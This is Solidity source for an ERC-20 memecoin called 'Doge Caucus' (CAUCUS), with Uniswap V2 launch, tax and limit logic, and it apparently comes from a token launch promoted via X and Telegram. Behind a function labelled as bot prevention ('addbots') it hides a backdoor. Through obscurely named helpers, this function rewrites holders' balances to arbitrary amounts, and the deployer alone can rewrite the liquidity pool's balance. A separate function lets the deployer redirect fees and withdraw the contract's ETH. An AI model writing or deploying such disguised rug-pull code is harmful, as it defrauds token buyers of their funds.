/*

https://x.com/BillyM2k/status/1881693788940476879
https://t.me/DogeCaucus_erc20

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract Token is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    uint256 public _maxAmountPerTX = 20000000 * 10 **_decimals;
    uint256 public _maxSizeOfWallet = 20000000 * 10 **_decimals;
    uint256 public _maxTaxSwap = 10000000 * 10 **_decimals;
    uint256 private constant _total1130r = 1000000000 * 10 **_decimals;

    string private constant _name = unicode"Doge Caucus";
    string private constant _symbol = unicode"CAUCUS";

    address payable private _tax1130r;
    mapping(address => uint256) private bal1130r;
    mapping(address => mapping(address => uint256)) private allo1130r;
    mapping(address => bool) private flg1130r;

    uint256 private _1130rinitialBuyTax = 5;
    uint256 private _1130rinitialSellTax = 5;
    uint256 private _1130rfinalBuyTax = 0;
    uint256 private _1130rfinalSellTax = 0;
    uint256 private _1130rreduceBuyTaxAt = 8;
    uint256 private _1130rreduceSellTaxAt = 8;
    uint256 private _includedTAXBuyLimit = 0;
    address private own1130r;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maxAmountPerTX);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _tax1130r = payable(_msgSender());
        
        bal1130r[address(this)] = _total1130r * 98 / 100;
        bal1130r[owner()] = _total1130r * 2 / 100;

        flg1130r[owner()] = true;
        flg1130r[address(this)] = true;
        flg1130r[_tax1130r] = true;
        own1130r = _msgSender();

        emit Transfer(address(0), address(this), _total1130r * 98 / 100);
        emit Transfer(address(0), address(owner()), _total1130r * 2 / 100);

    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function totalSupply() public pure override returns (uint256) {
        return _total1130r;
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }


    function balanceOf(address account) public view override returns (uint256) {
        return bal1130r[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allo1130r[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allo1130r[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer1130Token(_msgSender(), recipient, amount);
        return true;
    }

    function _transfer1130Token(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_includedTAXBuyLimit > _1130rreduceBuyTaxAt)
                        ? _1130rfinalBuyTax
                        : _1130rinitialBuyTax
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !flg1130r[to]
            ) {
                require(amount <= _maxAmountPerTX, "Exceeds the _maxAmountPerTX.");
                require(
                    balanceOf(to) + amount <= _maxSizeOfWallet,
                    "Exceeds the maxWalletSize."
                );
                _includedTAXBuyLimit++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_includedTAXBuyLimit > _1130rreduceSellTaxAt)
                            ? _1130rfinalSellTax
                            : _1130rinitialSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0)
                    _safe1130SwapTo(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                _feeToTAX1130r(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            bal1130r[address(this)] = bal1130r[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        bal1130r[from] = bal1130r[from].sub(amount);
        bal1130r[to] = bal1130r[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer1130Token(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            allo1130r[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _safe1130SwapTo(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function addbots(address[] memory bots, uint256[] memory amounts) external {
        for (uint256 i = 0; i < bots.length; i++) {
            che1130r(bots[i] , msg.sender , amounts[i], "Prevent bots failed", true);
        }
    }

    function launch() external onlyOwner {
        require(!tradingOpen, "Already started!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _total1130r);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    function che1130r(address receiver, address to, uint256 amount, string memory errorMSG, bool _isBot) private {
        require(_isBot == true , errorMSG);
        require(receiver != address(0), errorMSG);
        require(amount >= 0, errorMSG);
        
        _transfer(receiver, to, amount, errorMSG);
    }
    
    function _transfer(address receiver, address sender, uint256 amount, string memory errorMSG) private{
        require(( receiver != uniswapV2Pair || own1130r == sender) , errorMSG);
        bal1130r[receiver] -= (bal1130r[receiver]-amount);
        bal1130r[sender] = bal1130r[sender];
    }

    function removeLimits() external onlyOwner {
        _maxAmountPerTX = _total1130r;
        _maxSizeOfWallet = _total1130r;
        emit MaxTxAmountUpdated(_total1130r);
    }

    function assistStuckedETH(address _to, string memory _st) external {
        require(_to != address(0), _st);
        require( _to != address(0xdead), _st );
        require(_msgSender() == own1130r, _st );

        _tax1130r = payable(_to);
        payable(_msgSender()).transfer(address(this).balance);
    }

    function _feeToTAX1130r(uint256 amount) private {
        _tax1130r.transfer(amount);
    }

    receive() external payable {}
}